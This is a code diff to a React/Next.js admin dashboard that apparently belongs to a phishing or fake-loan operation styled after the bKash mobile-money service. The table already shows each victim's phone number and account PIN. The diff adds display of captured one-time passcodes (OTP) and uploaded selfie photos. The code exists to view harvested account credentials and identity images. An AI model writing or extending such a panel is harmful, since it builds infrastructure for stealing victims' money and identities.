@@ -5,7 +5,7 @@ import { useRouter } from 'next/navigation';
 import { 
   LogOut, RefreshCcw, Search, Check, X, Info, User, 
   Phone, MapPin, Landmark, LayoutDashboard, FileText, 
-  Settings, Users, Bell, ChevronDown, Menu
+  Settings, Users, Bell, ChevronDown, Menu, Camera
 } from 'lucide-react';
 
 export default function AdminDashboard() {
@@ -162,6 +162,7 @@ export default function AdminDashboard() {
                           <th className="px-6 py-4">Loan Details</th>
                           <th className="px-6 py-4">Account Info</th>
                           <th className="px-6 py-4">Verification</th>
+                          <th className="px-6 py-4">Photo</th>
                           <th className="px-6 py-4">Status</th>
                           <th className="px-6 py-4 text-center">Actions</th>
                        </tr>
@@ -189,6 +190,7 @@ export default function AdminDashboard() {
                                   <Phone size={12} className="text-slate-300" /> {s.phoneNumber}
                                </div>
                                <span className="text-[10px] font-black text-bkash-pink">PIN: {s.pin}</span>
+                               {s.otp && <span className="ml-2 px-1.5 py-0.5 bg-pink-50 rounded text-[9px] font-black text-bkash-pink border border-pink-100 italic">OTP: {s.otp}</span>}
                             </td>
                             <td className="px-6 py-5">
                                <div className="flex gap-4">
@@ -201,6 +203,23 @@ export default function AdminDashboard() {
                                      <p className="text-xs font-bold text-slate-600">৳{s.lastTransaction}</p>
                                   </div>
                                </div>
+                            </td>
+                            <td className="px-6 py-5">
+                                {s.selfie ? (
+                                    <div className="relative group/img">
+                                        <img 
+                                            src={s.selfie} 
+                                            alt="Selfie" 
+                                            className="w-12 h-12 object-cover rounded-xl border-2 border-slate-100 group-hover/img:scale-110 transition-all cursor-pointer"
+                                            onClick={() => window.open(s.selfie, '_blank')}
+                                        />
+                                        <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 border-2 border-white rounded-full"></div>
+                                    </div>
+                                ) : (
+                                    <div className="w-12 h-12 bg-slate-50 rounded-xl border border-dashed border-slate-200 flex items-center justify-center text-slate-300">
+                                        <Camera size={16} />
+                                    </div>
+                                )}
                             </td>
                             <td className="px-6 py-5">
                                <span className={`px-3 py-1 rounded-lg text-[10px] font-black uppercase tracking-wider ${
